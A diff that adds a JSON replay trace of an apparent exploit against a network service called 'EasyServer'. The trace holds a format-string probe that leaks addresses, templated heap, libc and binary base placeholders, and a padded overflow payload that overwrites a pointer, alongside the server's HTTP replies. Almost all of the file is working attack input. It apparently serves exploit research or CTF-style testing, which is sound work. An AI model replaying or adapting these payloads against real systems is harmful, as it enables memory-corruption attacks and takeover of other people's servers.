@@ -1,0 +1,7 @@
+[
+    "1Who r u?\\n", 
+    "0%3{{{HEAP_BASE:21553:3:ORI:2:0x702431}}}\\n", 
+    "1welcome!0x{{{LIBC_BASE:133168:12:HEX:10:0x7fa00c9e2830}}}", 
+    "0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x16r{{{ELF_BASE:6294688:3:ORI:74:0xa00ca0}}}\\x7f\\x00\\x00caaadaaa\\n", 
+    "1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x16r{{{ELF_BASE:6294688:3:ORI:74:0xa00ca0}}}\\x7fHTTP/1.1 404 Not Found\\r\\nContent-{{{HEAP_BASE:43348:3:ORI:110:0x707954}}}e: text/html; charset=UTF-8\\r\\nContent-Length: 23\\r\\nServer: EasyServer (Linux)\\r\\n\\r\\n<h3>Page Not Found</h3>"
+]
